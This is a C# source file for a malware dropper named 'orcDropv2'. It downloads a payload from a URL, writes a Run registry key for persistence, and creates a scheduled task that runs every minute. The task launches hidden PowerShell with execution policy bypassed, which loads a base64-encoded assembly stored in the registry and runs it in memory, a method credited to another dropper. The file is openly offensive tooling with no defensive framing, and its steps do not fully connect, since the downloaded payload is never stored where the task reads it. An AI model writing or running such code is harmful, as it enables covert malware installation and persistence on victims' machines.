using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace orcDropv2
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string Payload = DownloadMalware("https://127.0.0.1/Payload.exe");
            AddPayloadToRegistry();
            AddToSchtasks();
            Obfuscate.ObfuscateSourceCode();

        }

        private static string DownloadMalware(string url)
        {
            using (WebClient wc = new WebClient())
            {
                return wc.DownloadString(url);
            }
            
        }

        private static void AddPayloadToRegistry()
        {
            // Get the current user's registry hive
            RegistryKey registryKey = Registry.CurrentUser;

            // Open the desired registry path
            RegistryKey subKey = registryKey.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            // Add your payload to the registry
            subKey.SetValue("PayloadName", "C:\\Path\\To\\Your\\Payload.exe");

            subKey.Close();
            registryKey.Close();
        }

        //AddToSchtasks method taken from NYAN-CAT's dropper
        private static void AddToSchtasks()
        {
            string PS = @"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\Dropless-Malware\).Payload)).EntryPoint.Invoke($Null,$Null)";
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks",
                Arguments = "/create /sc minute /mo 1 /tn LimeLoader /tr " + "\"" + PS + "\"",
                CreateNoWindow = true,
                ErrorDialog = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });

        }
    }
}